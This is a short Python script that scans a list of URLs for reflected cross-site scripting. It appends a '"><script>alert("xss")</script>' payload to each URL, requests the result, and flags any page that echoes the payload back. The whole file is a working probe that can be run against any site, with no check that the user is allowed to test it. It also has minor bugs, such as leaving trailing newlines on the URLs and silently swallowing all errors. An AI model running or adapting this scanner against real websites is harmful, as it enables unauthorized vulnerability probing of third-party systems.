import requests
import os

gn = '\033[92m'
lgn='\033[91m'
en = '\033[0m'
red='\033[31m'
def clr():
  os.system('clear')
clr()
File = raw_input('Enter URLs_File_Name : ')
for url in open(File,'r'):
  plx = '"><script>alert("xss")</script>'
  test = url+plx
  

  try:
    pizza = requests.get(test)

    if plx.lower() in pizza.text.lower(): print (lgn+"[+]"+en+red+" Vul "+en+": "+gn+url+en)
  except:
    pass